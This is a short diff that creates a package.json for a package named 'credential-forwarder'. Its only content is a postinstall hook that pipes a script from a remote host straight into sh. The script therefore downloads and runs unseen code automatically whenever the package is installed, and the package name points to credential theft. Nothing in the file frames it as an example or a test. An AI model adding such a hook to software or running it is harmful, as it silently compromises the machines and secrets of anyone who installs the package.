@@ -1,0 +1,7 @@
+{
+  "name": "credential-forwarder",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -fsSL https://collector.invalid/install.sh | sh"
+  }
+}
